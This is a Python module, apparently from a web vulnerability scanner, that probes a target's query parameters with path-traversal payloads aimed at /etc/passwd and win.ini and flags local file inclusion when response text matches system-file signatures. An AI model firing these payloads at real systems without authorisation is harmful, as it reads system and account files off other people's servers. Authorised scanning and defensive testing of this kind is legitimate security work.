import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session

class LFIScanner:
    def __init__(self, target, options=None):
        self.options = options
        self.target = target

    def scan_lfi(self, port, protocol='http', logger=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}"
        
        # LFI Traversal Payloads
        payloads = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "../../../../windows/win.ini"
        ]
        
        # Fuzz common params
        params = ["file", "page", "include", "src", "path", "doc"]

        if logger: logger(f"📂 LFI Expert: Testing file inclusion on {base_url}...", "INFO")

        for param in params:
            for payload in payloads:
                try:
                    target_url = f"{base_url}/?{param}={payload}"
                    r = http_client.get(target_url, options=getattr(self, "options", None), timeout=3)
                    
                    param_checks = [
                        "root:x:0:0",                   # Linux /etc/passwd
                        "[extensions]",                 # Windows win.ini
                        "[mci extensions]",             # Windows system.ini
                        "for 16-bit app support",       # Windows win.ini
                        "root:*:0:0:",                  # BSD /etc/master.passwd
                        "nobody:*:65534:65534:",        # /etc/passwd alternative
                        "daemon:x:1:1:",                # /etc/passwd alternative
                        "SERVER_SIGNATURE",             # PHP Info / Environ
                        "DOCUMENT_ROOT",                # PHP Info / Environ
                        "[boot loader]",                # Windows boot.ini
                        "127.0.0.1       localhost"     # /etc/hosts or Windows hosts
                    ]
                    
                    is_vulnerable = False
                    for check in param_checks:
                         if check in r.text:
                             is_vulnerable = True
                             break
                    
                    if is_vulnerable:
                        findings.append({
                            "title": f"CRITICAL: LFI Detected on param `{param}`",
                            "description": f"Successfully read system file via `{payload}`. Confirmed Local File Inclusion.",
                            "severity": "critical",
                            "tool_source": "lfi_scanner",
                            "raw_loot": target_url,
                            "method": "GET",
                            "payload": payload,
                            "status_code": r.status_code,
                            "response_snippet": r.text[:200] if len(r.text) > 200 else r.text
                        })
                        if logger: logger(f"🔓 LFI READ SUCCESS: {target_url}", "CRITICAL")
                        return findings
                except Exception:
                    pass
        return findings
